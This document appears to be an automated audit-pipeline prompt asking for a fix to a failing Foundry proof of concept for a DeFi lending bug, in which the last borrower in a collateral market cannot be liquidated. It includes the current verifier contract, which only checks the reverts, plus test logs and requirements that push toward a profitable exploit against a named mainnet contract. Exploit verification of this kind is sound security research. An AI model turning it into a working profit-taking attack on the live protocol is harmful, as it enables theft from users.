You are fixing a failing Foundry PoC for finding F-001.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Attempt strategy (must follow for this attempt):
- strategy_label: v2_flashswap_funding
- strategy_instructions: Prefer UniswapV2/Sushi-like flashswap funding with deterministic repayment and minimal route complexity.
- Keep exploit root cause and `Exploit paths` unchanged; only vary funding/execution implementation details.

Finding:
- title: The final position in a collateral market is permanently exempt from liquidation
- claim: `liquidate` reverts with `CannotLiquidateLastPosition()` whenever a position's debt equals that market's entire debt supply. In `InterestRatePositionManager`, `redeemCollateral` is hard-disabled, so the last borrower for a collateral type has no remaining permissionless close-out path even after becoming undercollateralized.
- impact: A sole or last borrower in a market can leave unrecoverable bad debt after the collateral price falls. Because neither liquidation nor redemption can remove that position, the market can remain permanently underbacked.
- exploit_paths: ["Open the only live position for a collateral market and borrow R.", "Let the collateral value fall below the market MCR.", "Any `liquidate(position)` call reverts because `entireDebt == totalDebt`.", "`redeemCollateral` is disabled in `InterestRatePositionManager`, so no alternative permissionless recovery path remains."]

Current FlawVerifier.sol:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

interface IERC20Minimal {
    function balanceOf(address account) external view returns (uint256);
    function totalSupply() external view returns (uint256);
}

interface IPriceFeedMinimal {
    function fetchPrice() external returns (uint256 currentPrice, uint256 deviation);
}

interface ISplitLiquidationCollateralMinimal {
    function LOW_TOTAL_DEBT() external view returns (uint256);
    function MCR() external view returns (uint256);
}

interface IInterestRatePositionManagerMinimal {
    function rToken() external view returns (address);

    function collateralInfo(address collateralToken)
        external
        view
        returns (
            address raftCollateralToken,
            address raftDebtToken,
            address priceFeed,
            address splitLiquidation,
            bool isEnabled,
            uint256 lastFeeOperationTime,
            uint256 borrowingSpread,
            uint256 baseRate,
            uint256 redemptionSpread,
            uint256 redemptionRebate
        );

    function collateralTokenForPosition(address position) external view returns (address collateralToken);

    function liquidate(address position) external;

    function redeemCollateral(address collateralToken, uint256 debtAmount, uint256 maxFeePercentage) external;
}

contract FlawVerifier {
    error CannotLiquidateLastPosition();
    error Unsupported();
    error PositionNotConfigured();
    error PositionNotFound(address position);
    error PositionNotInConfiguredMarket(address expectedCollateral, address actualCollateral);
    error PositionHasNoDebt(address position);
    error PositionIsNotLastBorrower(uint256 positionDebt, uint256 totalDebt);
    error PositionIsHealthy(uint256 icr, uint256 mcr);
    error LiquidationDidNotRevertAsExpected();
    error RedemptionDidNotRevertAsExpected();

    struct Observation {
        address position;
        address collateralToken;
        address raftCollateralToken;
        address raftDebtToken;
        address priceFeed;
        address splitLiquidation;
        uint256 collateralBalance;
        uint256 debtBalance;
        uint256 totalDebt;
        uint256 price;
        uint256 icr;
        uint256 mcr;
        uint256 lowTotalDebt;
        bool isLastBorrower;
        bool isUndercollateralized;
    }

    address public constant TARGET = 0x9AB6b21cDF116f611110b048987E58894786C244;
    uint256 internal constant WAD = 1e18;

    address public candidatePosition;
    address public configuredCollateralToken;

    bool public executed;
    bool public hypothesisValidated;
    bool public hypothesisRefuted;
    bool public liquidationLastPositionRevertObserved;
    bool public redemptionUnsupportedObserved;

    bytes public liquidationRevertData;
    bytes public redemptionRevertData;
    string public failureReason;

    Observation internal lastObservation;

    constructor() {}

    function setCandidatePosition(address position) external {
        candidatePosition = position;
    }

    function setConfiguredCollateralToken(address collateralToken) external {
        configuredCollateralToken = collateralToken;
    }

    function executeOnOpportunity() external {
        executed = true;
        hypothesisValidated = false;
        hypothesisRefuted = false;
        liquidationLastPositionRevertObserved = false;
        redemptionUnsupportedObserved = false;
        delete liquidationRevertData;
        delete redemptionRevertData;
        delete failureReason;

        if (candidatePosition == address(0)) {
            // Path-stage infeasibility at this fixed fork:
            // - The exploit claim depends on a specific pre-existing "last borrower" position.
            // - The manager only exposes `collateralTokenForPosition(position)` and does not expose a position list.
            // - This verifier therefore cannot discover candidate positions fully on-chain and must be pointed at one.
            failureReason =
                "Concrete infeasibility at this fork: the protocol does not expose on-chain position enumeration, so a pre-existing candidate position must be configured before the verifier can test the last-borrower path.";
            return;
        }

        Observation memory obs = _observe(candidatePosition);
        lastObservation = obs;

        if (obs.collateralToken == address(0)) {
            failureReason = "Configured address does not currently map to a live position in the target manager.";
            return;
        }

        if (configuredCollateralToken != address(0) && configuredCollateralToken != obs.collateralToken) {
            failureReason = "Configured collateral token does not match the position's actual collateral market.";
            return;
        }

        if (obs.debtBalance == 0) {
            failureReason = "Configured position has zero debt at the fork block.";
            return;
        }

        if (obs.totalDebt != obs.debtBalance) {
            failureReason = "Configured position is not the last borrower for its collateral market at the fork block.";
            hypothesisRefuted = true;
            return;
        }

        if (obs.icr >= obs.mcr) {
            failureReason = "Configured last-borrower position is not undercollateralized at the fork block.";
            hypothesisRefuted = true;
            return;
        }

        try IInterestRatePositionManagerMinimal(TARGET).liquidate(candidatePosition) {
            failureReason = "Liquidation unexpectedly succeeded.";
            hypothesisRefuted = true;
            return;
        } catch (bytes memory reason) {
            liquidationRevertData = reason;
            liquidationLastPositionRevertObserved = _matchesSelector(reason, CannotLiquidateLastPosition.selector);
        }

        if (!liquidationLastPositionRevertObserved) {
            failureReason = "Liquidation reverted, but not with CannotLiquidateLastPosition().";
            hypothesisRefuted = true;
            return;
        }

        try IInterestRatePositionManagerMinimal(TARGET).redeemCollateral(obs.collateralToken, 1, WAD) {
            failureReason = "redeemCollateral unexpectedly succeeded.";
            hypothesisRefuted = true;
            return;
        } catch (bytes memory reason) {
            redemptionRevertData = reason;
            redemptionUnsupportedObserved = _matchesSelector(reason, Unsupported.selector);
        }

        if (!redemptionUnsupportedObserved) {
            failureReason = "redeemCollateral reverted, but not with Unsupported().";
            hypothesisRefuted = true;
            return;
        }

        failureReason =
            "Hypothesis validated without a profit path: the configured undercollateralized sole borrower is immune to liquidation and InterestRatePositionManager disables permissionless redemption.";
        hypothesisValidated = true;
    }

    function observe(address position) external returns (Observation memory) {
        Observation memory obs = _observe(position);
        lastObservation = obs;
        return obs;
    }

    function getLastObservation() external view returns (Observation memory) {
        return lastObservation;
    }

    function profitToken() external pure returns (address) {
        return address(0);
    }

    function profitAmount() external pure returns (uint256) {
        return 0;
    }

    function exploitPath() external pure returns (string memory) {
        return
            "Configure a pre-existing position address; verify it is the only debt-bearing position for its collateral market and already below MCR at fork block 18543485; liquidate() reverts with CannotLiquidateLastPosition(); redeemCollateral() reverts with Unsupported().";
    }

    function _observe(address position) internal returns (Observation memory obs) {
        bool ignoredEnabled;
        uint256 ignoredLastFeeOperationTime;
        uint256 ignoredBorrowingSpread;
        uint256 ignoredBaseRate;
        uint256 ignoredRedemptionSpread;
        uint256 ignoredRedemptionRebate;

        obs.position = position;
        obs.collateralToken = IInterestRatePositionManagerMinimal(TARGET).collateralTokenForPosition(position);

        if (obs.collateralToken == address(0)) {
            return obs;
        }

        (
            obs.raftCollateralToken,
            obs.raftDebtToken,
            obs.priceFeed,
            obs.splitLiquidation,
            ignoredEnabled,
            ignoredLastFeeOperationTime,
            ignoredBorrowingSpread,
            ignoredBaseRate,
            ignoredRedemptionSpread,
            ignoredRedemptionRebate
        ) = IInterestRatePositionManagerMinimal(TARGET).collateralInfo(obs.collateralToken);

        obs.collateralBalance = IERC20Minimal(obs.raftCollateralToken).balanceOf(position);
        obs.debtBalance = IERC20Minimal(obs.raftDebtToken).balanceOf(position);
        obs.totalDebt = IERC20Minimal(obs.raftDebtToken).totalSupply();
        obs.isLastBorrower = obs.debtBalance != 0 && obs.debtBalance == obs.totalDebt;

        obs.lowTotalDebt = ISplitLiquidationCollateralMinimal(obs.splitLiquidation).LOW_TOTAL_DEBT();
        obs.mcr = ISplitLiquidationCollateralMinimal(obs.splitLiquidation).MCR();
        (obs.price,) = IPriceFeedMinimal(obs.priceFeed).fetchPrice();
        obs.icr = _computeCR(obs.collateralBalance, obs.debtBalance, obs.price);
        obs.isUndercollateralized = obs.icr < obs.mcr;
    }

    function _computeCR(uint256 collateral, uint256 debt, uint256 price) internal pure returns (uint256) {
        if (debt == 0) {
            return type(uint256).max;
        }
        return collateral * price / debt;
    }

    function _matchesSelector(bytes memory reason, bytes4 selector) internal pure returns (bool) {
        if (reason.length < 4) {
            return false;
        }

        bytes4 actual;
        assembly {
            actual := mload(add(reason, 32))
        }
        return actual == selector;
    }
}

```

forge stdout (tail):
```
Compiling 2 files with Solc 0.8.30
Solc 0.8.30 finished in 1.96s
Compiler run successful with warnings:
Warning (2072): Unused local variable.
  --> test/ExploitPOC.t.sol:78:19:
   |
78 |         (bool ok, bytes memory ret) = address(verifier).call(abi.encodeWithSignature("executeOnOpportunity()"));
   |                   ^^^^^^^^^^^^^^^^


Ran 1 test for test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: profit below threshold] testExploit() (gas: 230854)
Logs:
  AUDITHOUND_BALANCE_BEFORE_WEI: 0
  AUDITHOUND_BALANCE_AFTER_WEI: 0
  AUDITHOUND_PROFIT_WEI: 0
  AUDITHOUND_PROFIT_ANY: 0
  AUDITHOUND_EFFECTIVE_PROFIT_WEI: 0
  AUDITHOUND_MIN_PROFIT_WEI: 1000000000000000
  AUDITHOUND_PROFIT_TOKEN: 0x0000000000000000000000000000000000000000
  AUDITHOUND_PROFIT_MODE: 0x0000000000000000000000000000000000000001

Traces:
  [230854] FlawVerifierTest::testExploit()
    ├─ [266] FlawVerifier::profitToken() [staticcall]
    │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    ├─ [206398] FlawVerifier::executeOnOpportunity()
    │   └─ ← [Stop]
    ├─ [266] FlawVerifier::profitToken() [staticcall]
    │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    ├─ [376] FlawVerifier::profitAmount() [staticcall]
    │   └─ ← [Return] 0
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_BEFORE_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_AFTER_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_ANY", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_EFFECTIVE_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_MIN_PROFIT_WEI", val: 1000000000000000 [1e15])
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_TOKEN", val: 0x0000000000000000000000000000000000000000)
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_MODE", val: ECRecover: [0x0000000000000000000000000000000000000001])
    └─ ← [Revert] profit below threshold

Backtrace:
  at FlawVerifierTest.testExploit

Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 3.73s (3.34ms CPU time)

Ran 1 test suite in 3.73s (3.73s CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)

Failing tests:
Encountered 1 failing test in test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: profit below threshold] testExploit() (gas: 230854)

Encountered a total of 1 failing tests, 0 tests succeeded

```

forge stderr (tail):
```

```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
